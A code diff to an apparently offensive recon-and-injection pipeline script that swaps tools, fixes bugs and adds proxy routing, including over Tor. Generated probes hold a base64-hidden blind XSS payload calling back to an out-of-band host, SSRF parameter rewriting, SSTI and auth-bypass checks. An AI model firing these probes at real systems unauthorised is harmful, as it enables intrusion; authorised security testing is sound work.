@@ -3,15 +3,15 @@
 reconchain.py — orchestrator for a chained recon pipeline.
 Pipeline
 ========
-01-RECON   subfinder | amass | assetfinder           --> all_subs.txt
+01-RECON   subfinder | amass                          --> all_subs.txt
 02-RESOLVE dnsx                                      --> resolved.txt
 03-PERMUTE dnsgen | dnsx                             --> permuted.txt
-04-SCAN    naabu/nmap | httpx | subjack/nuclei       --> ports.txt / hosts.txt / takeover.txt
-05-HARVEST gau | waybackurls | gospider | katana     --> urls_gau.txt / urls_katana.txt
+04-SCAN    naabu/nmap | httpx | nuclei                --> ports.txt / hosts.txt / takeover.txt
+05-HARVEST gau | gospider | katana                   --> urls_gau.txt / urls_katana.txt
            | subjs | waymore
-06-JSINTEL LinkFinder | SecretFinder | nuclei        --> js_secrets.txt
-07-PARAMS  ParamSpider | Arjun | x8                  --> params.txt
-08-FUZZ    ffuf | kiterunner | feroxbuster           --> fuzz.txt
+06-JSINTEL SecretFinder | nuclei                     --> js_secrets.txt
+07-PARAMS  Arjun                                     --> params.txt
+08-FUZZ    ffuf | feroxbuster                        --> fuzz.txt
 09-VULNSCAN nuclei (full + tech)                     --> nuclei.txt
 10-TLSCMS  testssl.sh | wpscan                       --> tls_wp.txt
 11-INJECT  kxss | dalfox | sqlmap | SSRF probes      --> vulns.txt
@@ -157,12 +157,15 @@ def _parse_httpx_tech(src: Path, dst: Path) -> int:
     """
     seen: Set[str] = set()
     for line in read_lines(src):
-        parts = line.strip().split()
-        if len(parts) >= 4:
-            url = parts[0]
-            status = parts[1] if len(parts) > 1 and parts[1].startswith("[") else ""
-            title = parts[2] if len(parts) > 2 and parts[2].startswith("[") else ""
-            tech = parts[3] if len(parts) > 3 and parts[3].startswith("[") else ""
+        line = line.strip()
+        if not line:
+            continue
+        url = line.split()[0]
+        brackets = re.findall(r'\[.*?\]', line)
+        if len(brackets) >= 3:
+            status = brackets[0]
+            title = brackets[1]
+            tech = brackets[2]
             entry = f"{url} {status} {title} {tech}".rstrip()
             if entry not in seen:
                 seen.add(entry)
@@ -257,7 +260,7 @@ class PipelineConfig:
     rate_limit: int = 0
     sample_urls_fuzz: int = 5
     sample_urls_params: int = 50
-    sample_urls_pspider: int = 20
+
     sample_hosts_ssl: int = 10
     sample_hosts_origin: int = 10
     sample_endpoints_l: int = 20
@@ -317,6 +320,34 @@ def _extra_http_args() -> List[str]:
             if h:
                 args += ["-H", h]
     return args
+
+
+def _get_urlopener() -> object:
+    """Return a urlopen-compatible callable that respects proxy configuration.
+    Returns either urllib.request.urlopen (no proxy) or a proxy-wrapped version."""
+    proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
+    if proxy:
+        handler = urllib.request.ProxyHandler({
+            "http": proxy,
+            "https": proxy,
+        })
+        opener = urllib.request.build_opener(handler)
+        return opener.open
+    return urllib.request.urlopen
+
+
+async def _throttle() -> None:
+    """Apply --delay between requests if configured."""
+    delay = _PIPELINE_CFG.delay
+    if delay > 0:
+        await asyncio.sleep(delay)
+
+
+def _throttle_sync() -> None:
+    """Synchronous throttle for non-async probe loops."""
+    delay = _PIPELINE_CFG.delay
+    if delay > 0:
+        time.sleep(delay)
 
 
 @dataclass
@@ -430,6 +461,8 @@ class Progress:
 
     def next(self, name: str):
         self._completed += 1
+        if self.bar.total == 0:
+            return
         stage_idx = 0
         if self.stages:
             phase_count = 0
@@ -625,6 +658,9 @@ class Interactsh:
             cmd += ["-t", token]
         try:
             self._log_fh = self.log.open("ab")
+            # remember the byte offset BEFORE the process starts so we
+            # don't miss any output produced during the startup window.
+            self._start_pos = self.log.stat().st_size
             self.proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, stdout=self._log_fh, stderr=subprocess.STDOUT)
         except FileNotFoundError:
             return False
@@ -632,8 +668,6 @@ class Interactsh:
             log("err", f"interactsh start failed: {e}")
             self._kill_proc()
             return False
-        # remember the byte offset where this run's output begins
-        self._start_pos = self.log.stat().st_size
         deadline = time.time() + 90
         try:
             while time.time() < deadline:
@@ -747,21 +781,7 @@ async def phase_01_RECON(
         )
         runner.chmod(0o755)
         jobs.append(("amass", ["bash", str(runner)], 1800))
-    if t.has("assetfinder"):
-        # use a small runner so we invoke assetfinder directly with proper
-        # argv quoting (no shell, no risk of injection from `domain`).
-        runner = outdir / "logs" / "assetfinder.sh"
-        ensure(runner)
-        runner.write_text(
-            "#!/usr/bin/env bash\n"
-            "set -eu\n"
-            f"OUT={shlex.quote(str(outdir / 'subs_assetfinder.txt'))}\n"
-            f"DOMAIN={shlex.quote(domain)}\n"
-            ': > "$OUT"\n'
-            'assetfinder --subs-only "$DOMAIN" >> "$OUT" 2>/dev/null || true\n'
-        )
-        runner.chmod(0o755)
-        jobs.append(("assetfinder", ["bash", str(runner)], 600))
+
     if not jobs:
         log("warn", "01-RECON: no subdomain tools available")
         ensure(out)
@@ -775,7 +795,6 @@ async def phase_01_RECON(
     _a1_sources = [
         outdir / "subs_subfinder.txt",
         outdir / "subs_amass.txt",
-        outdir / "subs_assetfinder.txt",
     ]
 
     async def _incremental_merge() -> None:
@@ -783,10 +802,10 @@ async def phase_01_RECON(
         _last_size = 0
         while True:
             await asyncio.sleep(30)
-        existing = [p for p in _a1_sources if p.exists()]
-        if existing:
-            current = sum(len(read_lines(p)) for p in existing)
-            if current > _last_size:
+            existing = [p for p in _a1_sources if p.exists()]
+            if existing:
+                current = sum(len(read_lines(p)) for p in existing)
+                if current > _last_size:
                     merge_unique(_a1_sources, out, validator=_under_domain)
                     _last_size = current
                     log("info", f"01-RECON: incremental merge — {count_nonblank(out)} subdomains so far")
@@ -870,8 +889,7 @@ async def phase_02_RESOLVE(
             1800, outdir,
         )
         if full_batch.exists() and read_lines(full_batch):
-            _merge_dnsx_output(full_batch, out, full)
-            cnt = count_nonblank(full_batch) if full_batch.exists() else 0
+            cnt = _merge_dnsx_output(full_batch, out, full)
             full_batch.unlink(missing_ok=True)
             tmp.unlink(missing_ok=True)
             return cnt
@@ -995,7 +1013,7 @@ async def phase_04_SCAN(
     log("info", "Phase 04-SCAN: ports / hosts / takeover (parallel)")
     # naabu/httpx/nuclei-takeover accept host:port (or hosts from httpx)
     hosts = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
-    # subjack needs CLEAN subdomains (no `[1.2.3.4]` suffix from dnsx -resp)
+    # nuclei takeover templates need CLEAN subdomains (no `[1.2.3.4]` suffix from dnsx -resp)
     subs = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
     ports_file = outdir / "ports.txt"
     jobs: List[Tuple[str, List[str], int]] = []
@@ -1091,24 +1109,7 @@ async def phase_04_SCAN(
                 1800,
             )
         )
-    if t.has("subjack") and have_subs:
-        jobs.append(
-            (
-                "subjack",
-                [
-                    "subjack",
-                    "-w",
-                    str(subs),
-                    "-t",
-                    "100",
-                    "-ssl",
-                    "-o",
-                    str(outdir / "takeover.txt"),
-                ],
-                1200,
-            )
-        )
-    elif have_hosts and t.has("nuclei"):
+    if have_hosts and t.has("nuclei"):
         jobs.append(
             (
                 "nuclei-takeover",
@@ -1261,24 +1262,7 @@ async def phase_05_HARVEST(
         )
         runner.chmod(0o755)
         g1.append(("gau", ["bash", str(runner)], 1800))
-    # waybackurls takes one host; iterate from file via runner to avoid
-    # embedding the host list in the bash argv (no ARG_MAX DoS).
-    if t.has("waybackurls"):
-        runner = outdir / "logs" / "wayback_runner.sh"
-        ensure(runner)
-        runner.write_text(
-            "#!/usr/bin/env bash\n"
-            "set -eu\n"
-            f"OUT={shlex.quote(str(outdir / 'urls_wayback.txt'))}\n"
-            f"IN={shlex.quote(str(hosts))}\n"
-            ': > "$OUT"\n'
-            'while IFS= read -r h || [[ -n "$h" ]]; do\n'
-            '  [ -z "$h" ] && continue\n'
-            '  waybackurls "$h" >> "$OUT" 2>/dev/null || true\n'
-            'done < "$IN"\n'
-        )
-        runner.chmod(0o755)
-        g1.append(("waybackurls", ["bash", str(runner)], 1800))
+
     if t.has("gospider"):
         # gospider's -o is an output *folder* (one file per site), not a file,
         # so we don't use it: run via a runner that captures stdout and extracts
@@ -1344,13 +1328,11 @@ async def phase_05_HARVEST(
                 1800,
             )
         )
-    if g1:
-        await run_parallel(g1, outdir)
-    if g2:
-        await run_parallel(g2, outdir)
+    all_g = g1 + g2
+    if all_g:
+        await run_parallel(all_g, outdir)
     harvested = [
         outdir / "urls_gau.txt",
-        outdir / "urls_wayback.txt",
         outdir / "urls_gospider.txt",
         outdir / "urls_katana.txt",
         outdir / "urls_subjs.txt",
@@ -1369,7 +1351,7 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
     _c2_out = outdir / "js_secrets.txt"
     if _c2_out.exists() and not force:
         return {"06-JSINTEL": str(_c2_out), "count": count_nonblank(_c2_out)}
-    log("info", "Phase 06-JSINTEL: JS analysis (LinkFinder + SecretFinder)")
+    log("info", "Phase 06-JSINTEL: JS analysis (SecretFinder + nuclei)")
     urls = outdir / "urls_all.txt"
     js_urls = outdir / "urls_js.txt"
     # crude filter: any URL whose path ends in a JS extension. Strip both
@@ -1387,18 +1369,6 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         ensure(outdir / "js_secrets.txt").write_text("")
         return {"06-JSINTEL": str(outdir / "js_secrets.txt"), "count": 0}
     jobs: List[Tuple[str, List[str], int]] = []
-    if t.has("linkfinder"):
-        runner = outdir / "logs" / "linkfinder_runner.sh"
-        ensure(runner)
-        runner.write_text(
-            "#!/usr/bin/env bash\n"
-            "set -eu\n"
-            f"OUT={shlex.quote(str(outdir / 'links.txt'))}\n"
-            f"IN={shlex.quote(str(js_urls))}\n"
-            'linkfinder -i "$IN" -o "$OUT" </dev/null >/dev/null 2>&1 || true\n'
-        )
-        runner.chmod(0o755)
-        jobs.append(("linkfinder", ["bash", str(runner)], 1200))
     if t.has("secretfinder"):
         runner = outdir / "logs" / "secretfinder_runner.sh"
         ensure(runner)
@@ -1441,8 +1411,16 @@ async def phase_06_JSINTEL(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         if json_keep:
             ensure(json_urls).write_text("\n".join(json_keep) + "\n")
     await run_parallel(jobs, outdir)
+    # Merge JSON endpoints back into urls_all.txt so downstream phases
+    # (params, fuzz, authz) can discover API surface from JS files.
+    if json_urls.exists() and read_lines(json_urls):
+        n_json = merge_unique(
+            [outdir / "urls_all.txt", json_urls],
+            outdir / "urls_all.txt",
+        )
+        log("info", f"06-JSINTEL: merged {n_json} JSON API endpoints into URL pool")
     n = merge_unique(
-        [outdir / "links.txt", outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
+        [outdir / "secrets.txt", outdir / "nuclei_exposures.txt"],
         outdir / "js_secrets.txt",
     )
     if n == 0:
@@ -1466,27 +1444,8 @@ async def phase_07_PARAMS(
     _d_urls = _dedupe_by_host_path(read_lines(urls))
     log("info", f"07-PARAMS: {len(read_lines(urls))} raw URLs → {len(_d_urls)} unique paths")
     jobs: List[Tuple[str, List[str], int]] = []
-    if t.has("paramspider"):
-        for u in _d_urls[:_PIPELINE_CFG.sample_urls_pspider]:
-            # ParamSpider -d expects a domain, not a full URL
-            domain_for_ps = _extract_domain(u)
-            out_part = outdir / f"params_spider_{safe_suffix(u)}.txt"
-            runner = outdir / "logs" / f"paramspider_{safe_suffix(u)}.sh"
-            ensure(runner)
-            runner.write_text(
-                "#!/usr/bin/env bash\n"
-                "set -eu\n"
-                f"OUT={shlex.quote(str(out_part))}\n"
-                f"URL={shlex.quote(u)}\n"
-                f"DOMAIN={shlex.quote(domain_for_ps)}\n"
-                ': > "$OUT"\n'
-                'paramspider -d "$DOMAIN" --quiet >> "$OUT" 2>/dev/null || true\n'
-            )
-            runner.chmod(0o755)
-            jobs.append((f"paramspider-{_safe_name(u, 40)}", ["bash", str(runner)], 1800))
-    # arjun and x8 write JSON, NOT plain text. We capture the JSON and
-    # normalize to one URL per line in the .txt sibling below.
-    # Over Tor these are very slow — sample URLs heavily
+    # arjun writes JSON. We capture the JSON and normalize to one URL per
+    # line in the .txt sibling below. Over Tor this is very slow — sample URLs.
     if t.has("arjun"):
         arjun_in = ensure(outdir / "urls_arjun_sample.txt")
         arjun_urls = _d_urls[:_PIPELINE_CFG.sample_urls_params]
@@ -1495,15 +1454,9 @@ async def phase_07_PARAMS(
             jobs.append(
                 ("arjun", ["arjun", "-i", str(arjun_in), "-o", str(outdir / "params_arjun.json")] + _extra_http_args(), 1800)
             )
-    if t.has("x8"):
-        x8_in = ensure(outdir / "urls_x8_sample.txt")
-        x8_urls = _d_urls[:_PIPELINE_CFG.sample_urls_params]
-        if x8_urls:
-            x8_in.write_text("\n".join(x8_urls) + "\n")
-            jobs.append(("x8", ["x8", "-u", str(x8_in), "-o", str(outdir / "params_x8.json")], 1800))
     await run_parallel(jobs, outdir)
-    # Normalize arjun / x8 JSON output to plain URL-per-line text.
-    for raw in (outdir / "params_arjun.json", outdir / "params_x8.json"):
+    # Normalize arjun JSON output to plain URL-per-line text.
+    for raw in (outdir / "params_arjun.json",):
         if not raw.exists():
             continue
         norm = raw.with_suffix(".txt")
@@ -1518,13 +1471,6 @@ async def phase_07_PARAMS(
             for k, v in data.items():
                 if isinstance(k, str) and (k.startswith("http://") or k.startswith("https://")):
                     urls_found.append(k)
-            # x8 v0.5+ output: {"results": [{"url": ..., "params": [...]}, ...]}
-            if not urls_found:
-                res = data.get("results") if isinstance(data, dict) else None
-                if isinstance(res, list):
-                    for r in res:
-                        if isinstance(r, dict) and r.get("url"):
-                            urls_found.append(str(r["url"]))
         # JSONL fallback
         if not urls_found:
             for rec in read_jsonl(raw):
@@ -1558,22 +1504,9 @@ def _extract_urls_from_ffuf_json(p: Path) -> List[str]:
     return out
 
 
-def _extract_urls_from_kiterunner_jsonl(p: Path) -> List[str]:
-    """kiterunner (`kr`) writes JSON-Lines, one record per matched endpoint."""
-    out: List[str] = []
-    if not p.exists():
-        return out
-    for rec in read_jsonl(p):
-        if not isinstance(rec, dict):
-            continue
-        url = rec.get("url") or rec.get("matched-raw-url")
-        if url:
-            out.append(str(url))
-    return out
-
-
-def _merge_dnsx_output(src: Path, hosts_out: Path, full_out: Path) -> None:
-    """Parse dnsx -resp output from `src` and append to hosts_out + full_out."""
+def _merge_dnsx_output(src: Path, hosts_out: Path, full_out: Path) -> int:
+    """Parse dnsx -resp output from `src` and append to hosts_out + full_out.
+    Returns the number of new hosts added."""
     seen_hosts: Set[str] = set()
     if hosts_out.exists():
         seen_hosts.update(l.strip().lower() for l in read_lines(hosts_out) if l.strip())
@@ -1592,8 +1525,10 @@ def _merge_dnsx_output(src: Path, hosts_out: Path, full_out: Path) -> None:
             seen_hosts.add(host.lower())
             new_hosts.append(host)
     if new_hosts:
-        full_out.write_text("\n".join(new_hosts) + "\n")
+        with full_out.open("a") as f:
+            f.write("\n".join(new_hosts) + "\n")
         hosts_out.write_text("\n".join(sorted(seen_hosts)) + "\n")
+    return len(new_hosts)
 
 
 def _dedupe_by_host_path(urls: List[str]) -> List[str]:
@@ -1631,7 +1566,7 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
     _proxy_opt = []
     _proxy = os.environ.get("PROXY", "")
     if _proxy:
-        _proxy_opt = ["-proxy", _proxy]
+        _proxy_opt = ["-x", _proxy]
     # When operating over proxychains/tor, use smaller wordlists and
     # shorter timeouts — each request is ~1-5s vs ~50ms on a direct link.
     _is_slow_network = _USE_PROXYCHAINS
@@ -1705,57 +1640,7 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
                         _ffuf_ext_timeout,
                     )
                 )
-    if t.has("kr"):
-        # Kiterunner needs .kite format wordlists. Try to find or generate one.
-        kite_file = os.environ.get("KITE_FILE", "")
-        if not kite_file or not Path(kite_file).exists():
-            # Try common kite file paths
-            for cand in [
-                "/tmp/common.kite",
-                os.path.expanduser("~/.kiterunner/wordlist.kite"),
-            ]:
-                if Path(cand).exists():
-                    kite_file = cand
-                    break
-        if not kite_file or not Path(kite_file).exists():
-            # Generate a .kite file from a text wordlist
-            src_wordlist = Path("/usr/share/seclists/Discovery/Web-Content/common.txt")
-            if src_wordlist.exists():
-                kite_file = str(outdir / "kr_wordlist.kite")
-                log("info", f"08-FUZZ: generating kite wordlist from {src_wordlist}")
-                proc = await asyncio.create_subprocess_exec(
-                    "kr",
-                    "kb",
-                    "convert",
-                    str(src_wordlist),
-                    kite_file,
-                    stdin=asyncio.subprocess.DEVNULL,
-                    stdout=asyncio.subprocess.DEVNULL,
-                    stderr=asyncio.subprocess.DEVNULL,
-                )
-                try:
-                    await asyncio.wait_for(proc.wait(), timeout=120)
-                except asyncio.TimeoutError:
-                    proc.kill()
-                    log("warn", "08-FUZZ: kite wordlist generation timed out")
-                    kite_file = ""
-                if not Path(kite_file).exists():
-                    kite_file = ""
-                    log("warn", "08-FUZZ: failed to generate kite wordlist")
-            else:
-                kite_file = ""
-        if not kite_file:
-            log("warn", "08-FUZZ: no kite wordlist available, skipping kiterunner")
-        else:
-            for u in sample:
-                out_jsonl = outdir / f"kr_{safe_suffix(u)}.jsonl"
-                jobs.append(
-                    (
-                        f"kiterunner-{_safe_name(u)}",
-                        ["kr", "scan", u, "-w", kite_file, "-o", str(out_jsonl)],
-                        3000,
-                    )
-                )
+
     if t.has("feroxbuster"):
         for u in sample:
             out_txt = outdir / f"fb_{safe_suffix(u)}.txt"
@@ -1771,8 +1656,6 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
     # Clean up stale normalized .txt files from prior runs first
     for old in outdir.glob("ffuf_*.txt"):
         old.unlink(missing_ok=True)
-    for old in outdir.glob("kr_*.txt"):
-        old.unlink(missing_ok=True)
     for old in outdir.glob("fb_*.txt"):
         old.unlink(missing_ok=True)
     normalized: List[Path] = []
@@ -1780,17 +1663,11 @@ async def phase_08_FUZZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, 
         norm = ffp.with_suffix(".txt")
         ensure(norm).write_text("\n".join(_extract_urls_from_ffuf_json(ffp)) + "\n")
         normalized.append(norm)
-    for krp in outdir.glob("kr_*.jsonl"):
-        norm = krp.with_suffix(".txt")
-        ensure(norm).write_text("\n".join(_extract_urls_from_kiterunner_jsonl(krp)) + "\n")
-        normalized.append(norm)
     normalized.extend(outdir.glob("fb_*.txt"))
     n = merge_unique(normalized, outdir / "fuzz.txt")
     for p in normalized:
         p.unlink(missing_ok=True)
     for p in outdir.glob("ffuf_*.json"):
-        p.unlink(missing_ok=True)
-    for p in outdir.glob("kr_*.jsonl"):
         p.unlink(missing_ok=True)
     if n == 0:
         log("warn", "08-FUZZ: fuzzers produced no hits")
@@ -1981,6 +1858,7 @@ async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet
     testssl_jobs.append(("tls-check", ["python3", str(tls_script)], 300))
     # wpscan writes per-host files natively via --output.
     # Skip if the host doesn't appear to be WordPress (check multiple indicators).
+    _f2_urlopen = _get_urlopener()
     wpscan_jobs: List[Tuple[str, List[str], int]] = []
     if t.has("wpscan"):
         for h in sample:
@@ -1992,7 +1870,7 @@ async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet
             for wp_path in ("/wp-login.php", "/wp-content/", "/wp-includes/"):
                 try:
                     req = urllib.request.Request(h.rstrip("/") + wp_path, method="HEAD")
-                    with urllib.request.urlopen(req, timeout=10) as resp:
+                    with _f2_urlopen(req, timeout=10) as resp:
                         if resp.status in (200, 301, 302, 403, 401):
                             wp_found = True
                             break
@@ -2002,7 +1880,7 @@ async def phase_10_TLSCMS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet
                 # Check homepage body for WordPress markers
                 try:
                     req = urllib.request.Request(h, method="GET", headers={"User-Agent": "Mozilla/5.0"})
-                    with urllib.request.urlopen(req, timeout=10) as resp:
+                    with _f2_urlopen(req, timeout=10) as resp:
                         body = resp.read().decode("utf-8", errors="ignore").lower()
                         if "wp-content" in body or "wordpress" in body:
                             wp_found = True
@@ -2159,8 +2037,15 @@ async def phase_11_INJECT(
             "#!/usr/bin/env python3\n"
             '"""SSRF probe: rewrite URL parameters to point at OAST listener and internal targets."""\n'
             "import os, random, sys, urllib.request, urllib.parse\n"
-            f"OAST = {shlex.quote(oast_domain)}\n"
-            f"IN = {shlex.quote(str(ssrf_in))}\n"
+            "# Proxy support: route through PROXY env var if set\n"
+            "_proxy = os.environ.get('PROXY', '')\n"
+            "if _proxy:\n"
+            "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
+            "    _urlopen = urllib.request.build_opener(_handler).open\n"
+            "else:\n"
+            "    _urlopen = urllib.request.urlopen\n"
+            f"OAST = {json.dumps(oast_domain)}\n"
+            f"IN = {json.dumps(str(ssrf_in))}\n"
             "SSRF_PARAMS = {\n"
             "    'url', 'uri', 'path', 'dest', 'redirect', 'img', 'target', 'site',\n"
             "    'view', 'domain', 'feed', 'host', 'to', 'out', 'callback', 'load',\n"
@@ -2188,7 +2073,7 @@ async def phase_11_INJECT(
             "        # Fire a direct HTTP probe to OAST as a ping (independent of param injection)\n"
             "        try:\n"
             "            ping_url = f'http://{OAST}/ssrf-ping/' + uuid.uuid4().hex[:12]\n"
-            "            urllib.request.urlopen(urllib.request.Request(ping_url, method='GET',\n"
+            "            _urlopen(urllib.request.Request(ping_url, method='GET',\n"
             "                headers={'User-Agent': 'Mozilla/5.0'}), timeout=10)\n"
             "        except Exception:\n"
             "            pass\n"
@@ -2204,7 +2089,7 @@ async def phase_11_INJECT(
             "                    try:\n"
             "                        req = urllib.request.Request(new_url, method='GET',\n"
             "                            headers={'User-Agent': 'Mozilla/5.0'})\n"
-            "                        urllib.request.urlopen(req, timeout=10)\n"
+            "                        _urlopen(req, timeout=10)\n"
             "                    except Exception:\n"
             "                        pass\n"
         )
@@ -2213,15 +2098,22 @@ async def phase_11_INJECT(
         # Blind XSS — inject a header that will callback to OAST when rendered server-side
         blind_xss_in = ensure(outdir / "urls_xss_blind.txt")
         blind_xss_urls = xss_urls[:_PIPELINE_CFG.sample_urls_xss_blind]
-        if blind_xss_urls and oast_domain:
+        if blind_xss_urls and oast_domain and _SAFE_HOST.match(oast_domain):
             blind_xss_in.write_text("\n".join(blind_xss_urls) + "\n")
             blind_script = outdir / "blind_xss_probe.py"
             blind_script.write_text(
                 "#!/usr/bin/env python3\n"
                 '"""Blind XSS probe: Fire requests with XSS payloads that call back to OAST."""\n'
                 "import os, sys, urllib.request\n"
-                f"OAST = {shlex.quote(oast_domain)}\n"
-                f"IN = {shlex.quote(str(blind_xss_in))}\n"
+                "# Proxy support: route through PROXY env var if set\n"
+                "_proxy = os.environ.get('PROXY', '')\n"
+                "if _proxy:\n"
+                "    _handler = urllib.request.ProxyHandler({'http': _proxy, 'https': _proxy})\n"
+                "    _urlopen = urllib.request.build_opener(_handler).open\n"
+                "else:\n"
+                "    _urlopen = urllib.request.urlopen\n"
+                f"OAST = {json.dumps(oast_domain)}\n"
+                f"IN = {json.dumps(str(blind_xss_in))}\n"
                 'PAYLOAD = f\'"><img src=x onerror=eval(atob("ZmV0Y2goImh0dHA6Ly97b2FzdH0vYmxpbmQ9eHNzIik=".replace("{oast}",OAST)))>\'\n'
                 "PAYLOAD2 = f'\\'-prompt`{OAST}`-\\''\n"
                 "with open(IN) as f:\n"
@@ -2234,7 +2126,7 @@ async def phase_11_INJECT(
                 "                headers={'User-Agent': PAYLOAD,\n"
                 "                        'Referer': PAYLOAD2,\n"
                 "                        'X-Forwarded-For': PAYLOAD})\n"
-                "            urllib.request.urlopen(req, timeout=10)\n"
+                "            _urlopen(req, timeout=10)\n"
                 "        except Exception:\n"
                 "            pass\n"
             )
@@ -2272,8 +2164,18 @@ async def phase_12_SSTI(
     if not all_urls:
         log("warn", "12-SSTI: no URLs; skipping")
         return {"12-SSTI": str(outdir / "ssti.txt"), "count": 0}
-    # Dedupe by (host, path) so the same path isn't SSTI-probed multiple times
-    all_urls = _dedupe_by_host_path(all_urls)
+    # Deduplicate by (host, path, sorted param keys) so different parameter
+    # names on the same path are all tested, not collapsed into one.
+    seen_keys: Set[Tuple[str, str, str, str]] = set()
+    deduped: List[str] = []
+    for u in all_urls:
+        parsed = urllib.parse.urlparse(u)
+        qs = frozenset(urllib.parse.parse_qs(parsed.query))
+        key = (parsed.scheme, parsed.hostname or "", parsed.path.rstrip("/"), str(sorted(qs)))
+        if key not in seen_keys:
+            seen_keys.add(key)
+            deduped.append(u)
+    all_urls = deduped
     param_urls = [u for u in all_urls if "=" in u]
     if not param_urls:
         param_urls = all_urls[:_PIPELINE_CFG.sample_urls_ssti]
@@ -2291,6 +2193,7 @@ async def phase_12_SSTI(
     ssti_findings: List[str] = []
     seen_ssti: Set[str] = set()
     _ssti_extra_headers = _extra_headers_dict()
+    _ssti_urlopen = _get_urlopener()
 
     for u in param_urls:
         parsed = urllib.parse.urlparse(u)
@@ -2306,6 +2209,7 @@ async def phase_12_SSTI(
                 if test_url in seen_ssti:
                     continue
                 seen_ssti.add(test_url)
+                await _throttle()
                 try:
                     _ssti_req_hdr = {"User-Agent": "Mozilla/5.0"}
                     _ssti_req_hdr.update(_ssti_extra_headers)
@@ -2313,7 +2217,7 @@ async def phase_12_SSTI(
                         test_url,
                         headers=_ssti_req_hdr,
                     )
-                    with urllib.request.urlopen(req, timeout=15) as resp:
+                    with _ssti_urlopen(req, timeout=15) as resp:
                         body = resp.read().decode("utf-8", errors="ignore")
                     if expected in body:
                         ssti_findings.append(
@@ -2406,6 +2310,7 @@ async def phase_14_ORIGIN(
     log("info", "Phase 14-ORIGIN: origin IP bypass enumeration")
     findings: List[str] = []
     _j_extra_headers = _extra_headers_dict()
+    _j_urlopen = _get_urlopener()
     hosts_file = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
     if not hosts_file.exists():
         hosts_file = outdir / "resolved.txt"
@@ -2423,7 +2328,7 @@ async def phase_14_ORIGIN(
             _j_fav_hdr = {"User-Agent": "Mozilla/5.0"}
             _j_fav_hdr.update(_j_extra_headers)
             req = urllib.request.Request(url, headers=_j_fav_hdr, method="GET")
-            with urllib.request.urlopen(req, timeout=10) as resp:
+            with _j_urlopen(req, timeout=10) as resp:
                 data = resp.read()
             if data:
                 h = _mmh3_hash(data) & 0xFFFFFFFF
@@ -2450,7 +2355,7 @@ async def phase_14_ORIGIN(
             _j_crt_hdr = {"User-Agent": "Mozilla/5.0"}
             _j_crt_hdr.update(_j_extra_headers)
             req = urllib.request.Request(crt_url, headers=_j_crt_hdr)
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            with _j_urlopen(req, timeout=15) as resp:
                 raw = resp.read().decode("utf-8", errors="ignore")
             certs = json.loads(raw)
             if not isinstance(certs, list) or not certs:
@@ -2635,7 +2540,7 @@ async def phase_14_ORIGIN(
                         req = urllib.request.Request(
                             f"https://ipinfo.io/{ip}/json", headers=_j_ip_hdr
                         )
-                        with urllib.request.urlopen(req, timeout=10) as resp:
+                        with _j_urlopen(req, timeout=10) as resp:
                             info = resp.read().decode("utf-8", errors="ignore")
                         info_data = json.loads(info)
                         ipcache_data[ip] = info_data
@@ -2700,6 +2605,7 @@ async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
         return {"15-SECRETS": str(_k_out), "count": count_nonblank(_k_out)}
     log("info", "Phase 15-SECRETS: deep JS secret scanning (custom regex + entropy + source maps)")
     _k_extra_headers = _extra_headers_dict()
+    _k_urlopen = _get_urlopener()
     js_urls = outdir / "urls_js.txt"
     if not js_urls.exists() or not read_lines(js_urls):
         log("warn", "15-SECRETS: no JS URLs; skipping")
@@ -2712,7 +2618,7 @@ async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
             _k_hdr = {"User-Agent": "Mozilla/5.0"}
             _k_hdr.update(_k_extra_headers)
             req = urllib.request.Request(js_url, headers=_k_hdr)
-            with urllib.request.urlopen(req, timeout=15) as resp:
+            with _k_urlopen(req, timeout=15) as resp:
                 body = resp.read().decode("utf-8", errors="ignore")
         except Exception:
             continue
@@ -2760,7 +2666,7 @@ async def phase_15_SECRETS(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSe
                 _k_sm_hdr = {"User-Agent": "Mozilla/5.0"}
                 _k_sm_hdr.update(_k_extra_headers)
                 sm_req = urllib.request.Request(sm_url, headers=_k_sm_hdr)
-                with urllib.request.urlopen(sm_req, timeout=15) as sm_resp:
+                with _k_urlopen(sm_req, timeout=15) as sm_resp:
                     sm_body = sm_resp.read().decode("utf-8", errors="ignore")
                 sm_data = json.loads(sm_body)
                 sources = sm_data.get("sources") or []
@@ -2877,6 +2783,7 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
         return {"16-AUTHZ": str(_l_out), "count": count_nonblank(_l_out)}
     log("info", "Phase 16-AUTHZ: auth bypass headers + mass assignment probes")
     findings: List[str] = []
+    _l_urlopen = _get_urlopener()
     # 1. Collect API-like endpoints from urls_all.txt + ffuf output
     urls = outdir / "urls_all.txt"
     api_endpoints: Set[str] = set()
@@ -2920,13 +2827,14 @@ async def phase_16_AUTHZ(outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
         results: List[str] = []
         try:
             base_req = urllib.request.Request(ep, method="GET")
-            with urllib.request.urlopen(base_req, timeout=8) as base_resp:
+            with _l_urlopen(base_req, timeout=8) as base_resp:
                 baseline_status = base_resp.status
                 baseline_body = base_resp.read()
                 baseline_len = len(baseline_body)
         except Exception:
             return results
